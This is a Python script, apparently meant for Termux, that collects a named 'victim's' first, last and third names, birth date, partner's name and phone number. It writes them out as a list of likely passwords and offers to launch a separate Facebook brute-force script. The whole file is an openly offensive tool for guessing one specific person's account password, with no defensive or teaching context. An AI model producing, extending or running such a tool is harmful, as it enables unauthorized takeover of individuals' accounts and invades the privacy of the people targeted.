#!/bin/python3
#taking import or library
import os,sys
import time
import requests
#functions for letter work
os.system("clear")
def banner():
    os.system("bash Banner.sh")
def PBF(banner):
    banner()
    #Thare user give info of victim and program send it on a file.
    fn=input("Enter Victim First Name:")
    ln=input("Enter Victim Last Name:")
    tn=input("Enter Victim 3rd Name:")
    d=input("Enter Birth of Day:")
    m=input("Enter Birth of Month:")
    y=input("Enter Birth of Year:")
    cn=input("Enter Crush/GF/BF Name:")
    cnl=input("Enter Crush/GF/BF Last Name:")
    pn=input("Enter Number:")
    fnn=fn+".txt"
    #Creating a file with victm first name
    p=open(fn+".txt","a")
    #password are making on there
    p.write(fn+"123" "\n")
    p.write(fn+"1234" "\n")
    p.write(fn+"12345" "\n")
    p.write(fn+"777" "\n")
    p.write(fn+"768" "\n")
    p.write(fn+"111" "\n")
    p.write(fn+"222" "\n")
    p.write(fn+"333" "\n")
    p.write(fn+"444" "\n")
    p.write(fn+"555" "\n")
    p.write(fn+"666" "\n")
    p.write(fn+"888" "\n")
    p.write(fn+"999" "\n")
    p.write(fn+"000" "\n")
    p.write(fn+"567" "\n")
    p.write(fn+"678" "\n")
    p.write(fn+"789" "\n")
    p.write(fn+"890" "\n")
    p.write(fn+"345" "\n")
    p.write(fn+"1111" "\n")
    p.write(fn+"2222" "\n")
    p.write(ln+"123" "\n")
    p.write(ln+"1234" "\n")
    p.write(ln+"12345" "\n")
    p.write(ln+"111""\n")
    p.write(ln+"000" "\n")
    p.write(ln+"222" "\n")
    p.write(ln+"333" "\n")
    p.write(ln+"444" "\n")
    p.write(ln+"555" "\n")
    p.write(ln+"666" "\n")
    p.write(ln+"777" "\n")
    p.write(ln+"888" "\n")
    p.write(ln+"999" "\n")
    p.write(ln+"1111" "\n")
    p.write(ln+"2222" "\n")
    p.write(ln+"3333" "\n")
    p.write(ln+"4444" "\n")
    p.write(ln+"5555" "\n")
    p.write(ln+"6666" "\n")
    p.write(ln+"7777" "\n")
    p.write(ln+"8888" "\n")
    p.write(ln+"9999" "\n")
    p.write(ln+"0000" "\n")
    p.write(tn+"123" "\n")
    p.write(tn+"1234" "\n")
    p.write(tn+"12345" "\n")
    p.write(tn+"000" "\n")
    p.write(tn+"111" "\n")
    p.write(tn+"222" "\n")
    p.write(tn+"333" "\n")
    p.write(tn+"444" "\n")
    p.write(tn+"555" "\n")
    p.write(tn+"666" "\n")
    p.write(tn+"777" "\n")
    p.write(tn+"888" "\n")
    p.write(tn+"999" "\n")
    p.write(tn+"1111" "\n")
    p.write(tn+"2222" "\n")
    p.write(tn+"3333" "\n")
    p.write(tn+"4444" "\n")
    p.write(tn+"5555" "\n")
    p.write(tn+"6666" "\n")
    p.write(tn+"7777" "\n")
    p.write(tn+"8888" "\n")
    p.write(tn+"9999" "\n")
    p.write(tn+"786" "\n")
    p.write(tn+"890" "\n")
    p.write(tn+fn+ln+"\n")
    p.write(fn+ln+tn+"\n")
    p.write(ln+fn+tn+"\n")
    p.write(ln+tn+fn+"\n")
    p.write(fn+ln+tn+"\n")
    p.write(d+m+y+"\n")
    p.write(m+d+y+"\n")
    p.write(y+d+m+"\n")
    p.write(d+y+m+"\n")
    p.write(m+y+d+"\n")
    p.write(y+m+d+"\n")
    p.write(y+d+m+"\n")
    p.write(cn+"123" "\n")
    p.write(cn+"1234" "\n")
    p.write(cn+"12345" "\n")
    p.write(cn+"786" "\n")
    p.write(cn+"999" "\n")
    p.write(cn+"111" "\n")
    p.write(cn+"222" "\n")
    p.write(cn+"333" "\n")
    p.write(cn+"444" "\n")
    p.write(cn+"555" "\n")
    p.write(cn+"666" "\n")
    p.write(cn+"777" "\n")
    p.write(cn+"888" "\n")
    p.write(cnl+"123" "\n")
    p.write(cnl+"1234" "\n")
    p.write(cnl+"12345" "\n")
    p.write(cnl+"786" "\n")
    p.write(cnl+"999" "\n")
    p.write(cnl+"111" "\n")
    p.write(cnl+"222" "\n")
    p.write(cnl+"333" "\n")
    p.write(cnl+"444" "\n")
    p.write(cnl+"555" "\n")
    p.write(cnl+"666" "\n")
    p.write(cnl+"777" "\n")
    p.write(cnl+"888" "\n")
    p.write(cnl+"999" "\n")
    p.write(pn+"\n")
    fni=input("Do you want Brute Force right now:")
    if "y" == fni:
        print("Copy it /data/data/com.termux/files/home/DARKPBF/"+fnn)
        time.sleep(10)
        os.system("python3 fbbrute.py")
    else:
        print("Passlist are created on PASSL0CK as",fn+".txt")
PBF(banner)
